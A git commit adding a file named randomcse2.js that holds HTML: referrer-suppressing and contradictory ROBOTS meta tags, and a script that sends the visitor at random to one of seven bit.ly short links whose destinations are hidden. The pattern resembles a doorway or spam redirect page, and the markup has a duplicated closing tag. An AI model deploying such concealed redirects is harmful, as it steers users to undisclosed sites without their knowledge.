fc8d708ffed9d97ca845017694f57513339bb4d7
dedisantosa <34833938+dedisantosa@users.noreply.github.com>
2019-12-12 19:52:33 +0700

    Create randomcse2.js

---
+++ randomcse2.js
@@ -0,0 +1,23 @@
+<meta name="referrer" content="none">
+<META NAME="ROBOTS" CONTENT="NOINDEX, FOLLOW">
+<META NAME="ROBOTS" CONTENT="INDEX, NOFOLLOW">
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<script type="text/javascript">
+
+var urls = new Array();
+urls[0] = "http://bit.ly/2YFislz";
+urls[1] = "http://bit.ly/2sfZ2rf";
+urls[2] = "http://bit.ly/38ucfgI";
+urls[3] = "http://bit.ly/36spgWf";
+urls[4] = "http://bit.ly/2PEIDEF";
+urls[5] = "http://bit.ly/2PGtaE3";
+urls[6] = "http://bit.ly/2PElmTy";
+
+var random = Math.floor(Math.random()*urls.length);
+
+window.location = urls[random];
+
+</script>
+</script>
